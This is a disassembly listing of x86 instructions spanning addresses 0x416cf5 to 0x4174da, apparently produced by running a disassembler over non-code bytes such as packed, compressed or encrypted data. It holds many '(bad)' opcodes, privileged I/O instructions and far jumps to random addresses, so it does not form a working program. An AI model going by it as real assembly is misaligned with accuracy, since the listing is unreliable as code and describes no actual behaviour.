  416cf5:	in     al,0xb3
  416cf7:	bound  edx,QWORD PTR [ebp-0x38]
  416cfa:	mul    ch
  416cfc:	add    al,0x34
  416cfe:	jecxz  0x416d2e
  416d00:	ror    DWORD PTR [eax+0x1a],0x1d
  416d04:	adc    eax,0xa93c71ce
  416d09:	test   BYTE PTR [ebp-0x35d7aacd],bh
  416d0f:	sar    BYTE PTR [eax-0x18c33ab4],0x2
  416d16:	(bad)  
  416d17:	and    bl,ah
  416d19:	push   ss
  416d1a:	ror    DWORD PTR [eax+0x5],1
  416d1d:	das    
  416d1e:	xchg   bl,dh
  416d20:	fcomp  DWORD PTR [ebx+eiz*2-0x33a91833]
  416d27:	sbb    DWORD PTR [ecx+0x301043ee],eax
  416d2d:	into   
  416d2e:	data16 and BYTE PTR [ecx],ch
  416d31:	pushf  
  416d32:	inc    edx
  416d33:	enter  0xe632,0x97
  416d37:	mov    dh,0x23
  416d39:	jbe    0x416d23
  416d3b:	xor    BYTE PTR [esi-0xe],dl
  416d3e:	(bad)  
  416d3f:	cmp    eax,0xb06d6b3e
  416d44:	adc    eax,DWORD PTR [eax+0x22eb9524]
  416d4a:	mul    ch
  416d4c:	pop    ecx
  416d4d:	out    dx,eax
  416d4e:	movd   DWORD PTR [edx+0xf],mm4
  416d52:	call   0x256e:0x5df8bca1
  416d59:	jp     0x416d55
  416d5b:	fst    QWORD PTR ds:0xb7ff44e7
  416d61:	(bad)  
  416d62:	and    al,0xd9
  416d64:	pop    ss
  416d65:	retf   0x4410
  416d68:	stos   BYTE PTR es:[edi],al
  416d69:	pop    ebx
  416d6a:	or     eax,0x3b93a5bd
  416d6f:	iret   
  416d70:	mov    esp,0xc081dc28
  416d75:	and    al,0x13
  416d77:	retf   
  416d78:	sahf   
  416d79:	push   cs
  416d7a:	jb     0x416d1d
  416d7c:	mov    DWORD PTR [ecx-0x50079f63],esp
  416d82:	and    al,0x88
  416d84:	(bad)  
  416d86:	adc    ah,BYTE PTR [eax-0x32]
  416d89:	std    
  416d8a:	and    edx,DWORD PTR [ebp+0x728f3d96]
  416d90:	jno    0x416d21
  416d92:	test   eax,0x3e25d07c
  416d97:	adc    dh,BYTE PTR [esi-0x42]
  416d9a:	pop    ss
  416d9b:	add    eax,0x6043de3c
  416da0:	scas   eax,DWORD PTR es:[edi]
  416da1:	dec    edi
  416da2:	xlat   BYTE PTR ds:[ebx]
  416da3:	xor    al,0x32
  416da5:	xchg   esi,eax
  416da6:	xchg   edi,eax
  416da7:	dec    ebp
  416da8:	and    BYTE PTR [ebp-0x238e988f],cl
  416dae:	ins    DWORD PTR es:[edi],dx
  416daf:	jmp    0xcf36:0x4d30ac2b
  416db6:	popa   
  416db7:	jecxz  0x416d6e
  416db9:	outs   dx,BYTE PTR ds:[esi]
  416dba:	pop    ebp
  416dbb:	icebp  
  416dbc:	add    edx,ecx
  416dbe:	out    0x17,eax
  416dc0:	adc    ecx,DWORD PTR [esi]
  416dc2:	push   0xd7cd903f
  416dc7:	lock or eax,0xfb9cb0cb
  416dcd:	scas   al,BYTE PTR es:[edi]
  416dce:	mov    bl,0x5e
  416dd0:	xor    DWORD PTR [esi-0x76eab93e],edx
  416dd6:	jns    0x416e10
  416dd8:	sub    al,0xa0
  416dda:	popa   
  416ddb:	adc    bh,BYTE PTR [ebx+0x5]
  416dde:	xchg   ecx,eax
  416ddf:	push   ecx
  416de0:	nop
  416de1:	dec    edx
  416de2:	jl     0x416e44
  416de4:	jg     0x416e39
  416de6:	push   esp
  416de7:	sub    bl,BYTE PTR [eax]
  416de9:	jmp    0x4d2d26a7
  416dee:	mov    al,ds:0x7f839e84
  416df3:	mov    bh,0xe3
  416df5:	or     eax,0x84c7b50
  416dfa:	jmp    0x573086a5
  416dff:	xchg   edx,eax
  416e00:	out    dx,eax
  416e01:	xor    bl,0x72
  416e04:	push   esi
  416e05:	push   ss
  416e06:	rcl    edx,cl
  416e08:	sahf   
  416e09:	mov    bh,0x75
  416e0b:	pop    ecx
  416e0c:	out    0xf5,eax
  416e0e:	cmc    
  416e0f:	and    BYTE PTR [ecx],bl
  416e11:	out    0x63,al
  416e13:	(bad)  
  416e14:	int    0x0
  416e16:	shl    DWORD PTR [esi+0x9],cl
  416e19:	sahf   
  416e1a:	cmp    cl,ch
  416e1c:	mov    al,0xb3
  416e1e:	lea    edi,ds:0x47f34925
  416e24:	inc    eax
  416e25:	leave  
  416e26:	cmp    DWORD PTR [esi-0x5538154c],ebx
  416e2c:	lahf   
  416e2d:	jl     0x416e26
  416e2f:	xor    ebp,edx
  416e31:	jl     0x416e51
  416e33:	and    al,0x73
  416e35:	or     al,0x6d
  416e37:	test   BYTE PTR [edi],cl
  416e39:	test   eax,0x3bc831d3
  416e3e:	jno    0x416e79
  416e40:	push   eax
  416e41:	sar    DWORD PTR [esi],1
  416e43:	jne    0x416e69
  416e45:	addr16 pop esi
  416e47:	clc    
  416e48:	and    al,0x55
  416e4a:	mov    BYTE PTR [ebx-0xf],al
  416e4d:	inc    edx
  416e4e:	pop    ebx
  416e4f:	sbb    ah,BYTE PTR [edi]
  416e51:	aam    0x6f
  416e53:	ins    DWORD PTR es:[edi],dx
  416e54:	mov    cl,0xdb
  416e56:	fwait
  416e57:	sbb    DWORD PTR [eax+0x4],edx
  416e5a:	inc    ebx
  416e5b:	mov    DWORD PTR [ecx+0x46],esi
  416e5e:	sub    DWORD PTR [edx+0x7b60c30],edx
  416e64:	mov    dh,0x20
  416e66:	inc    esp
  416e67:	and    DWORD PTR [esi+0x26],edx
  416e6a:	loope  0x416e49
  416e6c:	data16 xor BYTE PTR [ebp-0x6b],al
  416e70:	data16 fadd st,st(3)
  416e73:	test   al,0xea
  416e75:	xchg   esp,eax
  416e76:	xor    BYTE PTR [ecx-0x3f9623e0],ah
  416e7c:	imul   ebx,ecx,0xe1e85fb6
  416e82:	pop    ecx
  416e83:	or     BYTE PTR [ecx],ch
  416e85:	push   esi
  416e86:	cmp    bl,BYTE PTR [edx-0x63]
  416e89:	add    BYTE PTR [edi],bl
  416e8b:	dec    esi
  416e8c:	inc    ebp
  416e8d:	retf   0x8648
  416e90:	addr16 dec esp
  416e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e93:	sbb    bl,ah
  416e95:	out    0xc1,eax
  416e97:	mov    edx,0x6cd6321b
  416e9c:	xchg   ebp,eax
  416e9d:	push   esi
  416e9e:	inc    ebp
  416e9f:	jmp    0x5a4d2c37
  416ea4:	mov    ds:0x3c391bc5,al
  416ea9:	enter  0x4a67,0x63
  416ead:	jbe    0x416e3c
  416eaf:	pop    ecx
  416eb0:	push   cs
  416eb1:	sbb    BYTE PTR [ecx+0x4d],dl
  416eb4:	ds imul ebx
  416eb7:	shl    BYTE PTR [edx],0xbc
  416eba:	push   0xb823cc6d
  416ebf:	adc    al,0x43
  416ec1:	outs   dx,DWORD PTR ds:[esi]
  416ec2:	jno    0x416ec5
  416ec4:	sti    
  416ec5:	cmp    ebp,DWORD PTR es:[edi]
  416ec8:	ror    DWORD PTR [esi-0x5d],cl
  416ecb:	outs   dx,DWORD PTR ds:[esi]
  416ecc:	bound  ecx,QWORD PTR ds:0x45d95c01
  416ed2:	test   eax,0xad31e96e
  416ed7:	pop    ebp
  416ed8:	(bad)
  416edb:	cmp    al,0x15
  416edd:	xchg   bh,bh
  416edf:	or     eax,0xdc2a8ab6
  416ee4:	sub    esi,DWORD PTR [ecx]
  416ee6:	mov    ebp,0x9d0d62ee
  416eeb:	push   eax
  416eec:	and    al,bl
  416eee:	xchg   esi,eax
  416eef:	ror    BYTE PTR [edx],0x65
  416ef2:	push   0xb651c794
  416ef7:	and    BYTE PTR [esi-0x61],dl
  416efa:	mov    BYTE PTR [esi+0x5e1c66ae],dh
  416f00:	or     eax,0xe6ea8907
  416f05:	or     al,0xaa
  416f07:	aas    
  416f08:	cs inc ebx
  416f0a:	mov    dl,0x82
  416f0c:	dec    eax
  416f0d:	test   al,0xa9
  416f0f:	lock inc edi
  416f11:	adc    eax,0x584ace4c
  416f16:	les    esp,FWORD PTR [eax+eiz*1]
  416f19:	clc    
  416f1a:	mov    eax,ds:0xa95a0566
  416f1f:	shl    edx,cl
  416f21:	jmp    FWORD PTR [esi+0x39f043b4]
  416f27:	loop   0x416ee6
  416f29:	dec    eax
  416f2a:	xchg   edx,eax
  416f2b:	xor    eax,0xfc151382
  416f30:	cmp    eax,0xdf9909a4
  416f35:	cwde   
  416f36:	test   DWORD PTR [ebx+eax*2],0xe3a72aa9
  416f3d:	push   ss
  416f3e:	fst    QWORD PTR [ebp+0x36]
  416f41:	mov    ah,dl
  416f43:	cmc    
  416f44:	leave  
  416f45:	mov    ebp,0xfb838f63
  416f4a:	push   0x60
  416f4c:	sbb    al,0x12
  416f4e:	aaa    
  416f4f:	into   
  416f50:	dec    edi
  416f51:	cmc    
  416f52:	jp     0x416f30
  416f54:	or     dh,BYTE PTR [ecx]
  416f56:	repz fldcw WORD PTR [eax]
  416f59:	xor    DWORD PTR [ebp+0x3d],eax
  416f5c:	sbb    cl,BYTE PTR [edx]
  416f5e:	fcomp  st(2)
  416f60:	mov    esp,0xaf3f303c
  416f65:	push   ebp
  416f66:	push   ebx
  416f67:	sub    eax,0x5a2e44c
  416f6c:	test   BYTE PTR [edi],0x7b
  416f6f:	arpl   ax,bp
  416f71:	inc    eax
  416f72:	jno    0x416f8f
  416f74:	dec    esi
  416f75:	xor    bh,BYTE PTR [ebp-0x72]
  416f78:	retf   0x5b09
  416f7b:	mov    dh,0xd2
  416f7d:	popf   
  416f7e:	and    ecx,ebx
  416f80:	push   ss
  416f81:	cmc    
  416f82:	leave  
  416f83:	scas   eax,DWORD PTR es:[edi]
  416f84:	and    eax,0x91955c9d
  416f89:	jne    0x416f88
  416f8b:	push   es
  416f8c:	push   ds
  416f8d:	or     esp,DWORD PTR [edx-0x6912d5f]
  416f93:	xor    al,0xd
  416f95:	push   bx
  416f97:	push   es
  416f98:	dec    edi
  416f99:	pop    eax
  416f9a:	aam    0x17
  416f9c:	mov    BYTE PTR [esi+0x62],ch
  416f9f:	mov    ds:0xd4bef5c9,al
  416fa4:	jno    0x416f87
  416fa6:	sub    cl,BYTE PTR [ebp-0x551cdbec]
  416fac:	dec    eax
  416fad:	jo     0x416ff0
  416faf:	(bad)  
  416fb0:	jmp    0x416f32
  416fb2:	adc    eax,0xf4b58577
  416fb7:	sbb    eax,0x5139e3f9
  416fbc:	mov    cl,0xd8
  416fbe:	stos   BYTE PTR es:[edi],al
  416fbf:	xchg   BYTE PTR [edx],ch
  416fc1:	ficomp WORD PTR [eax+0x40]
  416fc4:	dec    eax
  416fc5:	mov    ds:0x6482988c,eax
  416fca:	sbb    al,al
  416fcc:	cmp    bh,ah
  416fce:	test   al,0xfe
  416fd0:	mov    eax,0x5c7eeae1
  416fd5:	stos   BYTE PTR es:[edi],al
  416fd6:	jno    0xe46474ba
  416fdc:	imul   edx,DWORD PTR [edi-0x73713c7f],0xffffff87
  416fe3:	sbb    BYTE PTR [ecx+edi*1-0x4f],cl
  416fe7:	inc    edx
  416fe8:	sub    BYTE PTR [edx+0x10],ah
  416feb:	jnp    0x417065
  416fed:	aas    
  416fee:	mov    dl,BYTE PTR [ecx+0x7f]
  416ff1:	aad    0x17
  416ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff4:	or     dh,BYTE PTR [esi-0x5e]
  416ff7:	sub    al,0x87
  416ff9:	xchg   ebp,eax
  416ffa:	js     0x416fbb
  416ffc:	and    DWORD PTR [ebx],ebp
  416ffe:	xor    esi,edi
  417000:	or     eax,0x86f10d3f
  417005:	jo     0x416f90
  417007:	aam    0xff
  417009:	or     ah,BYTE PTR [esi+edx*2-0x1b555094]
  417010:	xchg   ebp,eax
  417011:	leave  
  417012:	int    0x74
  417014:	popf   
  417015:	xchg   edx,eax
  417016:	sbb    dl,cl
  417018:	jae    0x41705e
  41701a:	jo     0x417080
  41701c:	or     al,0x6a
  41701e:	stos   BYTE PTR es:[edi],al
  41701f:	in     eax,0x64
  417021:	ss mov esi,0xe9a567c4
  417027:	lods   eax,DWORD PTR ds:[esi]
  417028:	dec    eax
  417029:	pop    esi
  41702a:	daa    
  41702b:	fisttp QWORD PTR [ecx-0x6c]
  41702e:	(bad)  
  41702f:	loope  0x417091
  417031:	aas    
  417032:	mov    DWORD PTR [ecx],ebx
  417034:	fisub  DWORD PTR [esi+0x37df9d5a]
  41703a:	mov    al,0x37
  41703c:	(bad)  [edi+0x35]
  41703f:	lock mov ch,0x67
  417042:	test   BYTE PTR [esi-0x1b],dh
  417045:	out    dx,al
  417046:	nop
  417047:	push   0x25b6b1c4
  41704c:	mov    BYTE PTR [ebx+0x12],dl
  41704f:	sti    
  417050:	xchg   ebp,eax
  417051:	shl    DWORD PTR [edi+0x4e],1
  417054:	ins    BYTE PTR es:[edi],dx
  417055:	shr    BYTE PTR [ebx+eax*2-0x381c0c82],0xa0
  41705d:	sub    eax,0x92651b93
  417062:	js     0x4170b6
  417064:	lock or DWORD PTR [esi+0x60d32387],ebx
  41706b:	inc    edx
  41706c:	ror    BYTE PTR [ecx],1
  41706e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41706f:	cwde   
  417070:	xchg   esi,eax
  417071:	fimul  DWORD PTR [ecx-0x62]
  417074:	mul    DWORD PTR [ebx+0x42]
  417077:	mov    dh,0x4d
  417079:	pushf  
  41707a:	jecxz  0x41704e
  41707c:	aad    0x58
  41707e:	les    esp,FWORD PTR [esi-0x22]
  417081:	sbb    ebx,edx
  417083:	ins    DWORD PTR es:[edi],dx
  417084:	enter  0x1cd,0x76
  417088:	stos   DWORD PTR es:[edi],eax
  417089:	mov    esp,0x8c9cf8e8
  41708e:	push   esp
  41708f:	adc    esi,esi
  417091:	in     eax,0xbf
  417093:	scas   al,BYTE PTR es:[edi]
  417094:	xchg   ebp,eax
  417095:	aad    0x92
  417097:	mov    bh,0xb6
  417099:	out    dx,al
  41709a:	es jle 0x41709c
  41709d:	test   DWORD PTR [esi+0x422a9907],edi
  4170a3:	xchg   ebx,eax
  4170a4:	push   esi
  4170a5:	pop    ebp
  4170a6:	ins    BYTE PTR es:[edi],dx
  4170a7:	fnsave [edi+0x5]
  4170aa:	popa   
  4170ab:	xor    BYTE PTR ds:0x1d63ccfe,bh
  4170b1:	ja     0x41712d
  4170b3:	repnz loopne 0x417053
  4170b6:	out    0xc5,al
  4170b8:	ja     0x4170d2
  4170ba:	cmp    BYTE PTR [ecx],ch
  4170bc:	xor    BYTE PTR ds:0xb9e7bca4,ch
  4170c2:	movq   mm0,QWORD PTR [ecx+0x1204ed0a]
  4170c9:	(bad)  
  4170ca:	mov    esi,0xb39cbead
  4170cf:	pop    esp
  4170d0:	ja     0x41707e
  4170d2:	add    edi,0x7f4a06f6
  4170d8:	sbb    al,dl
  4170da:	and    BYTE PTR [edi+eiz*4],dh
  4170dd:	sub    ecx,DWORD PTR [ebx]
  4170df:	scas   ax,WORD PTR es:[edi]
  4170e1:	pop    es
  4170e2:	fs ja  0x417150
  4170e5:	jne    0x4170f6
  4170e7:	mov    ecx,0x23c247f
  4170ec:	std    
  4170ed:	sahf   
  4170ee:	inc    eax
  4170ef:	shl    BYTE PTR [eax-0x4c],1
  4170f2:	lock scas eax,DWORD PTR es:[edi]
  4170f4:	mov    dh,0x79
  4170f6:	lods   eax,DWORD PTR ds:[esi]
  4170f7:	(bad)  
  4170f8:	inc    ebp
  4170f9:	inc    ebp
  4170fa:	jge    0x4170df
  4170fc:	out    0xcc,al
  4170fe:	stc    
  4170ff:	into   
  417100:	cs scas al,BYTE PTR es:[edi]
  417102:	xchg   edi,eax
  417103:	jp     0x417156
  417105:	call   0xa9fbc3af
  41710a:	xor    eax,DWORD PTR [eax]
  41710c:	in     eax,0x2d
  41710e:	adc    eax,0x558ca972
  417113:	sbb    bh,BYTE PTR [ebx+0x23]
  417116:	pop    ebp
  417117:	(bad)  
  417118:	neg    BYTE PTR [edx+0x3a]
  41711b:	adc    eax,0x6dde67ca
  417120:	and    esi,ebx
  417122:	out    0x64,eax
  417124:	xchg   esi,eax
  417125:	push   ecx
  417126:	pop    ebp
  417127:	mov    DWORD PTR [ecx-0x6992bf3],ecx
  41712d:	or     DWORD PTR [esi+0x73124f94],ecx
  417133:	push   0xe
  417135:	jp     0x417154
  417137:	add    ebp,DWORD PTR [edx+edi*2-0x42c3b444]
  41713e:	sbb    ch,dl
  417140:	loopne 0x4170d1
  417142:	cmp    ecx,DWORD PTR [edx]
  417144:	ja     0x4170f9
  417146:	mov    dl,0x94
  417148:	pop    ds
  417149:	fdiv   st(7),st
  41714b:	jg     0x4170d7
  41714d:	(bad)  
  41714e:	xchg   esi,eax
  41714f:	js     0x4170e4
  417151:	aaa    
  417152:	xor    BYTE PTR [eax+0x193d6104],0x50
  417159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41715a:	mov    BYTE PTR [ecx-0x16],bh
  41715d:	cmp    eax,0x8465176c
  417162:	add    eax,0x69259d8c
  417167:	pop    eax
  417168:	pop    edi
  417169:	or     al,0xda
  41716b:	in     al,dx
  41716c:	pop    es
  41716d:	pop    esi
  41716e:	es retf 0x1153
  417172:	xor    eax,0xe888b59b
  417177:	cmp    al,0x1b
  417179:	les    ecx,FWORD PTR [edx]
  41717b:	pop    ebp
  41717c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41717d:	sbb    edx,DWORD PTR [edi]
  41717f:	and    DWORD PTR [esi+0xfef4557],esi
  417185:	ins    DWORD PTR es:[edi],dx
  417186:	and    DWORD PTR [ebp+0x2f],0xffffffae
  41718a:	mov    edx,0xcaf7cd4d
  41718f:	pop    eax
  417190:	imul   DWORD PTR [ebx-0x2892c44b]
  417196:	cs pop ss
  417198:	sbb    bh,BYTE PTR [edx]
  41719a:	cwde   
  41719b:	test   al,0xac
  41719d:	ret    0x605b
  4171a0:	push   0xffffff90
  4171a2:	loopne 0x4171dd
  4171a4:	lods   al,BYTE PTR ds:[esi]
  4171a5:	push   eax
  4171a6:	jl     0x4171c9
  4171a8:	jmp    0x41720a
  4171aa:	mov    BYTE PTR [eax-0x70336a50],dh
  4171b0:	nop
  4171b1:	dec    edi
  4171b2:	in     eax,dx
  4171b3:	ins    DWORD PTR es:[edi],dx
  4171b4:	cmp    esi,ecx
  4171b6:	cs sahf 
  4171b8:	mov    esi,0xb1b6b713
  4171bd:	fidivr WORD PTR [esi+0x1679a40d]
  4171c3:	jl     0x4171fa
  4171c5:	push   ss
  4171c6:	jmp    0x9723:0xaefcc775
  4171cd:	fisttp QWORD PTR [edi+0x5b]
  4171d0:	xor    edx,esi
  4171d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171d3:	call   0x53709f58
  4171d8:	shr    ch,cl
  4171da:	(bad)  
  4171dc:	jmp    0x96d8958c
  4171e1:	xchg   ecx,eax
  4171e2:	sahf   
  4171e3:	and    ch,BYTE PTR [ebp-0x51]
  4171e6:	jnp    0x4171a9
  4171e8:	mov    ds:0xc386bbcd,eax
  4171ed:	mov    edx,0x9771f3cd
  4171f2:	mov    edi,0x665a3585
  4171f7:	adc    BYTE PTR [esi-0x5d15df8f],bh
  4171fd:	js     0x41727c
  4171ff:	in     eax,dx
  417200:	pop    esi
  417201:	dec    eax
  417202:	xchg   esi,eax
  417203:	xor    eax,0xddddb504
  417208:	sti    
  417209:	pop    esp
  41720a:	mov    ah,0xdd
  41720c:	(bad)  
  41720d:	hlt    
  41720e:	xor    BYTE PTR [edx],bh
  417210:	mov    esi,0x3ad6e72d
  417215:	mov    ah,0x29
  417217:	dec    ebp
  417218:	jns    0x41723b
  41721a:	mov    bh,0xdd
  41721c:	mov    WORD PTR [edi*4-0x3b68d6e5],ss
  417223:	ins    DWORD PTR es:[edi],dx
  417224:	cli    
  417225:	pushf  
  417226:	addr16 dec ecx
  417228:	les    esp,FWORD PTR [ebx-0x7f]
  41722b:	inc    esi
  41722c:	popf   
  41722d:	mov    edi,0xc4b10e44
  417232:	clc    
  417233:	add    bh,ch
  417235:	jle    0x4171be
  417237:	clc    
  417238:	aam    0x7f
  41723a:	ss mov ebx,0xb1d3319d
  417240:	ret    
  417241:	loope  0x4172ac
  417243:	ins    BYTE PTR es:[edi],dx
  417244:	call   0xd3d2:0x4cf2b547
  41724b:	mov    ebx,esp
  41724d:	push   0xa338554c
  417252:	or     BYTE PTR [eax+0x43],0x67
  417256:	ffree  st(5)
  417258:	icebp  
  417259:	cmp    al,0xea
  41725b:	imul   ebp,DWORD PTR [esi],0x28
  41725e:	mov    ebp,0x59f4c18e
  417263:	lods   al,BYTE PTR ds:[esi]
  417264:	cmp    bh,dl
  417266:	sbb    bl,BYTE PTR [eax-0x6f8ed5b5]
  41726c:	inc    esp
  41726d:	rcr    BYTE PTR [edx+0x6f183341],cl
  417273:	mov    ch,0x98
  417275:	mov    ebx,0xd6ed5266
  41727a:	mov    dh,0xcd
  41727c:	lahf   
  41727d:	jb     0x4172cc
  41727f:	call   0xdb56:0x583e062c
  417286:	sbb    al,0x1d
  417288:	sbb    eax,0x99526887
  41728d:	dec    esi
  41728e:	push   ds
  41728f:	dec    edx
  417290:	in     eax,0xc4
  417292:	xchg   esi,eax
  417293:	push   ebp
  417294:	add    bl,BYTE PTR [eax]
  417296:	xor    edi,DWORD PTR [ebx+0x51e11597]
  41729c:	fs adc eax,0xd7ca8116
  4172a2:	cli    
  4172a3:	xchg   BYTE PTR [ebp+ebx*8-0x68],al
  4172a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a8:	adc    BYTE PTR [ecx],ch
  4172aa:	push   edi
  4172ab:	push   edx
  4172ac:	ja     0x4172e5
  4172ae:	aam    0x4d
  4172b0:	ja     0x417287
  4172b2:	xor    al,0x53
  4172b4:	repz add al,0x67
  4172b7:	and    eax,0x7b225acd
  4172bc:	push   cs
  4172bd:	sahf   
  4172be:	xchg   edx,eax
  4172bf:	mov    esi,DWORD PTR [ecx+0x57]
  4172c2:	scas   eax,DWORD PTR es:[edi]
  4172c3:	js     0x417291
  4172c5:	sbb    al,0x49
  4172c7:	xchg   ebx,eax
  4172c8:	ds std 
  4172ca:	out    0xd7,eax
  4172cc:	retf   0x8608
  4172cf:	mov    ch,0xb0
  4172d1:	clc    
  4172d2:	out    dx,eax
  4172d3:	pop    es
  4172d4:	hlt    
  4172d5:	enter  0x5d52,0xa0
  4172d9:	jecxz  0x417320
  4172db:	aam    0x7
  4172dd:	push   es
  4172de:	enter  0xb0c6,0x13
  4172e2:	xor    eax,0x6bad6bb4
  4172e7:	dec    ebx
  4172e8:	dec    edi
  4172e9:	loope  0x4172b7
  4172eb:	lods   al,BYTE PTR ds:[esi]
  4172ec:	imul   edi,DWORD PTR [ebx+0x38],0x74
  4172f0:	and    dl,dl
  4172f2:	lock mov bh,0x37
  4172f5:	pusha  
  4172f6:	dec    ebx
  4172f7:	jp     0x4172eb
  4172f9:	scas   al,BYTE PTR es:[edi]
  4172fa:	mov    ah,BYTE PTR [edx]
  4172fc:	je     0x41737d
  4172fe:	push   0x5
  417300:	loop   0x417352
  417302:	stc    
  417303:	mov    bh,0x55
  417305:	push   cs
  417306:	sbb    DWORD PTR [esi+0x6b],esp
  417309:	stos   DWORD PTR es:[edi],eax
  41730a:	in     al,0xe0
  41730c:	mov    DWORD PTR [ecx],ebx
  41730e:	dec    eax
  41730f:	push   esi
  417310:	dec    ecx
  417311:	(bad)  [ecx]
  417313:	leave  
  417314:	fist   WORD PTR [edx+0x59]
  417317:	out    0xd2,eax
  417319:	push   edi
  41731a:	adc    BYTE PTR [edx],dh
  41731c:	lods   al,BYTE PTR ds:[esi]
  41731d:	test   BYTE PTR [edi+0x50],bl
  417320:	mov    al,ds:0x46710699
  417325:	mov    bl,0x8c
  417327:	xchg   di,ax
  417329:	sub    BYTE PTR [ebp-0x1a],dl
  41732c:	jg     0x4172bb
  41732e:	dec    eax
  41732f:	jne    0x417367
  417331:	repz repnz and al,0x8c
  417335:	ret    
  417336:	push   ecx
  417337:	leave  
  417338:	sahf   
  417339:	ins    BYTE PTR es:[edi],dx
  41733a:	sub    ecx,DWORD PTR [ebx]
  41733c:	shl    esp,cl
  41733e:	jmp    0xc1ee:0x77f9b060
  417345:	fnstsw WORD PTR ds:0xb026deae
  41734b:	adc    eax,0xb8ee4436
  417350:	(bad)
  417353:	ja     0x41731a
  417355:	jne    0x417320
  417357:	fldenv [esi+0x660cda39]
  41735d:	inc    eax
  41735e:	xchg   BYTE PTR [ebx+0x461057ab],dh
  417364:	and    al,0xa0
  417366:	xchg   BYTE PTR [eax+0x198e1a3c],bl
  41736c:	scas   al,BYTE PTR es:[edi]
  41736d:	and    al,0x65
  41736f:	lods   al,BYTE PTR ds:[esi]
  417370:	mov    bh,0x89
  417372:	sbb    edx,DWORD PTR [ebx]
  417374:	fld    TBYTE PTR [ecx+0x68]
  417377:	add    DWORD PTR [eax],esi
  417379:	clc    
  41737a:	jmp    0xb7b7:0xea44385a
  417381:	mov    ds:0xa4a4ae28,eax
  417386:	or     cl,cl
  417388:	mov    dl,0x6
  41738a:	add    dh,al
  41738c:	shr    BYTE PTR ss:[edx-0x30],cl
  417390:	mov    WORD PTR ds:0xf4b53da5,gs
  417396:	fild   DWORD PTR [esi]
  417398:	fild   WORD PTR [esi-0x46e02091]
  41739e:	push   edx
  41739f:	xchg   ecx,eax
  4173a0:	les    eax,FWORD PTR [ecx-0x7ef16032]
  4173a6:	and    dh,bl
  4173a8:	jmp    0x7542:0x56f45a8
  4173af:	sbb    DWORD PTR [esi+0x26242e6d],esi
  4173b5:	mov    edi,0xf5a21e00
  4173ba:	cmp    eax,0xf960e6db
  4173bf:	test   al,0x1f
  4173c1:	cmp    al,BYTE PTR [edx-0xd]
  4173c4:	call   0x764aec66
  4173c9:	cmp    al,0xc7
  4173cb:	psllq  mm3,mm1
  4173ce:	and    DWORD PTR [edi],edi
  4173d0:	mov    dl,0xaf
  4173d2:	es icebp 
  4173d4:	jmp    0x417377
  4173d6:	mov    cs,WORD PTR [edi]
  4173d8:	rol    BYTE PTR [ebx],cl
  4173da:	lods   al,BYTE PTR ds:[esi]
  4173db:	add    eax,DWORD PTR [edx+0x73]
  4173de:	leave  
  4173df:	mov    ds:0x85209980,al
  4173e4:	xor    eax,0x772c5943
  4173e9:	fisubr WORD PTR [eax+ecx*2]
  4173ec:	push   edx
  4173ed:	fdivrp st(2),st
  4173ef:	push   0xe5096e90
  4173f4:	jl     0x4173ae
  4173f6:	cmp    bl,BYTE PTR ds:0xda3c1176
  4173fc:	cli    
  4173fd:	xor    al,0x28
  4173ff:	inc    esi
  417400:	scas   al,BYTE PTR es:[edi]
  417401:	sub    edi,edx
  417403:	jmp    0x7716:0xaaf42fcf
  41740a:	cmp    eax,0xcfabfbd5
  41740f:	mov    edx,0xfa189906
  417414:	jae    0x4173fb
  417416:	shl    al,cl
  417418:	add    DWORD PTR [edi],esi
  41741a:	out    0xdb,al
  41741c:	jp     0x41744e
  41741e:	adc    eax,0xa0cd1058
  417423:	and    BYTE PTR [ecx],bh
  417425:	xchg   BYTE PTR [edx],ch
  417427:	je     0x41741c
  417429:	ret    0x86c3
  41742c:	sub    bl,dh
  41742e:	scas   eax,DWORD PTR es:[edi]
  41742f:	mov    esp,0x370de77d
  417434:	xchg   esp,eax
  417435:	push   cs
  417436:	and    eax,0x6947ea66
  41743b:	sbb    al,al
  41743d:	mov    ds:0x7979dc6a,eax
  417442:	ficom  DWORD PTR [edx]
  417444:	sub    ebx,DWORD PTR ds:0x5482781b
  41744a:	ror    BYTE PTR [esi+0x21dedd24],0x6b
  417451:	jns    0x4174d0
  417453:	je     0x417427
  417455:	stc    
  417456:	mov    dh,0xfa
  417458:	xor    al,0xdd
  41745a:	aad    0x19
  41745c:	rdpmc  
  41745e:	jmp    0x417403
  417460:	mov    ?,edi
  417462:	test   eax,0x6702c6a4
  417467:	shl    BYTE PTR [edx+0x53],cl
  41746a:	dec    ebp
  41746b:	sbb    BYTE PTR [esi],ah
  41746d:	xor    ebp,ebx
  41746f:	mov    ebp,0xb3083c52
  417474:	(bad)  
  417475:	fninit 
  417477:	mov    al,ds:0xeeaa9363
  41747c:	and    eax,0x411026f9
  417481:	aas    
  417482:	pop    es
  417483:	inc    edi
  417484:	add    esp,ecx
  417486:	js     0x417478
  417488:	repz xchg ebx,eax
  41748a:	std    
  41748b:	std    
  41748c:	cmp    DWORD PTR [esi+0x17],esp
  41748f:	adc    BYTE PTR [edi+ecx*4+0x4e],dl
  417493:	out    0x74,eax
  417495:	sub    dh,BYTE PTR [edx+ebx*4+0x21]
  417499:	in     eax,dx
  41749a:	or     al,BYTE PTR [esi+0x74207425]
  4174a0:	(bad)  
  4174a1:	fwait
  4174a2:	pop    ds
  4174a3:	add    DWORD PTR [ebx+0x2c],0x6a
  4174a7:	jne    0x4174c6
  4174a9:	sbb    al,0x7
  4174ab:	rcl    BYTE PTR [ecx-0x68],cl
  4174ae:	cmp    BYTE PTR [edx],0xba
  4174b1:	add    dl,BYTE PTR [eax+0x8279a4a]
  4174b7:	cmp    ebp,esi
  4174b9:	ss scas al,BYTE PTR es:[edi]
  4174bb:	jo     0x4174c6
  4174bd:	cmp    DWORD PTR [ebp+0x32714294],esp
  4174c3:	aas    
  4174c4:	jns    0x4174b9
  4174c6:	ucomiss xmm2,DWORD PTR ds:0x60ff2181
  4174cd:	out    0x15,eax
  4174cf:	hlt    
  4174d0:	data16 (bad) 
  4174d2:	xchg   ebx,eax
  4174d3:	call   0x725f68d4
  4174d8:	fdiv   DWORD PTR [edx]
  4174da:	push   ebp
